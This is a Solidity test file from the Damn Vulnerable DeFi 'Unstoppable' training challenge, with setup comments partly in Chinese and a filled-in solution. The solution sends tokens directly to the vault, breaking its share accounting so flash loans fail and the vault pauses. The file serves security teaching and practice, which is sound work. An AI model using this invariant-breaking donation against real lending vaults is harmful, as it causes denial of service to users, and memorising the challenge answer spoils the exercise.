// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {UnstoppableVault, Owned} from "../../src/unstoppable/UnstoppableVault.sol";
import {UnstoppableMonitor} from "../../src/unstoppable/UnstoppableMonitor.sol";

contract UnstoppableChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");

    uint256 constant TOKENS_IN_VAULT = 1_000_000e18;
    uint256 constant INITIAL_PLAYER_TOKEN_BALANCE = 10e18;

    DamnValuableToken public token;
    UnstoppableVault public vault;
    UnstoppableMonitor public monitorContract;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        /*
        相当于:
        vm.deal(deployer, 2 ** 128);
        vm.startPrank(deployer);
        */
        startHoax(deployer);
        // Deploy token and vault
        // DVT部署的时候会给sender授权无限额度, 即deployer拥有DVT的无限额度
        token = new DamnValuableToken();
        // asset = DVT, share = tDVT
        vault = new UnstoppableVault({_token: token, _owner: deployer, _feeRecipient: deployer});

        // Deployer在Vault质押1,000,000 DVT
        token.approve(address(vault), TOKENS_IN_VAULT);
        vault.deposit(TOKENS_IN_VAULT, address(deployer));

        // player拥有10 DVT
        token.transfer(player, INITIAL_PLAYER_TOKEN_BALANCE);

        // Deploy monitor contract and grant it vault's ownership
        monitorContract = new UnstoppableMonitor(address(vault));
        // monitor是Vault的owner
        vault.transferOwnership(address(monitorContract));

        // Monitor checks it's possible to take a flash loan
        vm.expectEmit();
        emit UnstoppableMonitor.FlashLoanStatus(true);
        monitorContract.checkFlashLoan(100e18);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        // Check initial token balances
        assertEq(token.balanceOf(address(vault)), TOKENS_IN_VAULT);
        assertEq(token.balanceOf(player), INITIAL_PLAYER_TOKEN_BALANCE);

        // Monitor is owned
        assertEq(monitorContract.owner(), deployer);

        // Check vault properties
        assertEq(address(vault.asset()), address(token));
        assertEq(vault.totalAssets(), TOKENS_IN_VAULT);
        assertEq(vault.totalSupply(), TOKENS_IN_VAULT);
        assertEq(vault.maxFlashLoan(address(token)), TOKENS_IN_VAULT);
        assertEq(vault.flashFee(address(token), TOKENS_IN_VAULT - 1), 0);
        assertEq(vault.flashFee(address(token), TOKENS_IN_VAULT), 50000e18);

        // Vault is owned by monitor contract
        assertEq(vault.owner(), address(monitorContract));

        // Vault is not paused
        assertFalse(vault.paused());

        // Cannot pause the vault
        vm.expectRevert("UNAUTHORIZED");
        vault.setPause(true);

        // Cannot call monitor contract
        vm.expectRevert("UNAUTHORIZED");
        monitorContract.checkFlashLoan(100e18);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_unstoppable() public checkSolvedByPlayer {
        token.transfer(address(vault), 1 ether);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private {
        // Flashloan check must fail
        vm.prank(deployer);
        vm.expectEmit();
        emit UnstoppableMonitor.FlashLoanStatus(false);
        monitorContract.checkFlashLoan(100e18);

        // And now the monitor paused the vault and transferred ownership to deployer
        assertTrue(vault.paused(), "Vault is not paused");
        assertEq(vault.owner(), deployer, "Vault did not change owner");
    }
}
